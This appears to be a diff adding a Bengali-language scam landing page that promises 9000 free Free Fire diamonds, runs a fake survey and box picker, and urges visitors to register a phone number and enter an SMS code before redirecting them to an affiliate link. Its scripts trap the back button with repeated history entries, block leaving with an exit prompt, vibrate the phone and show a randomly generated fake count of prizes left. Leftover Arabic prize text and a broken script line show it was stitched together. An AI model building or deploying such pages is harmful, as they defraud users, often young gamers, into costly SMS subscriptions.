@@ -1,0 +1,186 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<title>  বিনামূল্যে আগুন বার্ষিকী </title>
+	<link rel="canonical" href="https://blabaneg.pages.dev" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="lander" content="survey-pick-a-box">
+<meta name="description" content="survey-pick-a-box">
+<link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+<link href="css/app.css" type="text/css" rel="stylesheet" />
+<link href="app.css" type="text/css" rel="stylesheet" />
+<meta name="robots" content="noindex,nofollow">
+<script defer data-domain="blaban" src="js/script.js"></script>
+</head>
+<body style="background: url('https://www11.0zz0.com/2024/10/13/17/354711248.png');background-repeat: no-repeat;background-size: cover;">
+<div>
+  <img src="https://www11.0zz0.com/2024/10/13/17/354711248.png" style="filter: drop-shadow(5px 5px 5px #242327);" width="160px" height="160px">
+</div>
+<div class="app" id="app" v-cloak>
+<vue-modal v-show="!showRotator && !showPrize" :open="showOpeningModal" class="opening-modal">
+<img class="opening-modal__image" src="https://www11.0zz0.com/2024/10/13/17/354711248.png" style="width: 165px;filter: drop-shadow(5px 5px 5px #242327);" alt="Apple iPhone 13 Pro Max" />
+<h1 class="heading heading--h1">
+  !! অভিনন্দন!
+</h1>
+<p class="paragraph"> ফ্রি ফায়ার টানা 4 বছর ধরে বিশ্বের সবচেয়ে বেশি ডাউনলোড করা মোবাইল গেম!
+  এই কৃতিত্ব উদযাপন করতে 9000 রত্ন পান 🔥🎁
+  এখনই পান🎁👇.
+.
+</p>
+<p class="paragraph">
+</p>
+<button class="button" v-on:click="showOpeningModal = false; $confetti.stop()">
+  এখনই পান🎁👇
+</button>
+</vue-modal>
+<vue-modal :open="showInstructionsModal">
+<img src="N49BUCH.png" style="width: 80px;">
+<h2 class="heading heading--h1">   আপনার উত্তর সফলভাবে সংরক্ষণ করা হয়েছে</h2>
+<p class="paragraph">
+  এখন আপনি হীরা পেতে একটি সুযোগ আছে
+<br><br>
+
+✅ 9000 রত্ন পেতে আপনার ফোন নম্বর নিবন্ধন করুন
+<br><br>
+✅আপনি নম্বর সহ একটি মেসেজ কোড পাবেন তা প্রম্পটে লিখুন এবং হ্যাঁ চাপুন।.</p>
+<button class="button" onclick="go()">
+  ধারাবাহিকতা
+</button>
+</vue-modal>
+<vue-modal :open="showFailModal">
+<h1 class="heading heading--h1">حظ أوفر في المرة القادمة</h1>
+<p class="paragraph">
+.لديك (2) فرص اضافية
+</p>
+<button class="button" v-on:click="showFailModal = false">
+موافق
+</button>
+</vue-modal>
+<vue-modal :open="showSuccessModal">
+<img src="UarHZhk.png" style="width: 300px;">
+<h1 class="heading heading--h1">!!تهانينا لك</h1>
+<p class="paragraph">
+انت الرابح معنا بجائزة <br><br> ٣ القنبلة + ٣ أزر بـ لبن + ٤ قشطوطة + ٣ كشري + ٤ ام علي <br><br>اتبع التعليمات التالية للحصول على جائزتك
+</p>
+<button class="button" onclick="go();">
+استمرار
+</button>
+</vue-modal>
+<div class="left" style="display: none;">
+<div class="product-preview">
+<div class="product-preview__title">
+</div>
+</div>
+</div>
+<div class="right" style="
+border-radius: 20px;
+">
+<vue-box-picker v-if="showBoxPicker" :vertical-items="4"  lid-image="id.png" box-image="box.png" box-back-image="box-back.png" prize-image="img/prizes/iphone-13-pro-max/default@0.75x.png" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
+<div class="verify" v-if="showRotator">
+<style>
+  #lolbox{grid-template-columns: repeat(4, 1fr);border-radius: 20px;border: 1px solid black;box-shadow: 7px 7px 20px white}
+</style>
+<vue-text-rotator id="lolbox" v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
+                     "....অনুগ্রহ করে একটু অপেক্ষা করুন। ",
+              "......অনুগ্রহ করে একটু অপেক্ষা করুন। ",
+              "......অনুগ্রহ করে একটু অপেক্ষা করুন।",  ]'>
+</vue-text-rotator>
+<div class="verify__text" v-if="rotateIndex > 1">
+<strong>
+  আপনি সব প্রশ্নের উত্তর দিয়েছেন
+</strong>
+<img class="verify__icon verify__icon--checked" src="checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+  আপনার উত্তর প্রক্রিয়া করা হচ্ছে
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 2">
+<strong>
+  ডায়মন্ড স্কলারশিপের জন্য সফলভাবে নিবন্ধন করা হয়েছে</strong>
+<img class="verify__icon verify__icon--checked" src="checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+  হীরা অনুদানের জন্য নিবন্ধন চলছে
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 3">
+<strong id="left-in">
+  মাত্র 1294টি পুরস্কার বাকি!
+</strong>
+<img class="verify__icon verify__icon--checked" src="checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+  হীরা অনুদানের জন্য আপনার নম্বর পরীক্ষা করা হচ্ছে
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="spinner.gif" alt="" />
+</div>
+</div>
+<vue-survey style="
+border-radius: 20px;
+border: 1px solid black;
+box-shadow: 7px 7px 20px #502323;
+" v-if="showSurvey" v-if="showSurvey" :show-steps="true" :questions='[
+            {
+              title: "  আপনার লিঙ্গ কি?              ",
+              answers: [ { text: "পুরুষ" }, { text: "মেয়েলি" } ]
+            },
+            {
+              title: "  তোমার বয়স কত?              ",
+              answers: [ { text: "  ১৮ বছরের নিচে " }, { text: "18-29" }, { text: "30-39" }, { text: "40-49" }, { text: "50+" } ]
+            },
+            {
+              title: "     আপনি কি কখনো হীরার জন্য আবেদন করেছেন?              ",
+              answers: [ { text: "হ্যাঁ              " }, { text: "না" } ]
+            },
+          ]' v-on:finish="onSurveyFinish"></vue-survey>
+</div>
+</div>
+<!-- <img src='https://i.ibb.co/0ZmyQP6/70898.jpg' width='80%'/> -->
+<script>window.view = window.view || {};view.offerUrl = "https:\/\/rdr.funcontent.xyz/click";view.qs = null;view.skip = 0;view.screenshot = 0;view.download = 1;view.noredir = false;</script> <script src="js/app.js?id=d41d8cd98f00b204e980" type="application/javascript"></script>
+<script src="app.js" type="application/javascript"></script>
+<script>
+function go() {
+    window.onbeforeunload = null;
+    window.location.href = 'https://goearn.ayznoo.online/?utm_medium=809e04a148290452e5c0c5202f20838bb9122677&utm_campaign=maream&cid=256321';
+}
+</script>
+<script>
+var PreventExitPop = true;
+function ExitPop() {
+    if (PreventExitPop != false) {
+        return "Don't miss out!";
+    }
+}
+window.onbeforeunload = ExitPop;
+</script>
+<script>
+    ! function() {
+    var t;
+    try {
+        const URL = window.location.href.split(/[#]/)[0];
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
+        onpopstate = function(event) {
+            event.state &&
+        }
+    } catch (o) {
+        console.log(o);
+    }
+}();
+</script>
+<script>
+	navigator.vibrate([1000, 300, 1000, 300,1000]);
+</script>
+<script src="p.js" defer></script>
+<script>
+  // Function to generate a random number between 200 and 2000
+  function getRandomNumber(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+  }
+
+  // Set the random number to the element with ID 'left-in'
+  document.getElementById('left-in').innerText = `!تبقي ${getRandomNumber(200, 2000)} جائزة فقط`;
+</script>
+<noscript><img src="l3NimxL.png" width="1" height="1" /></noscript>
+</html>
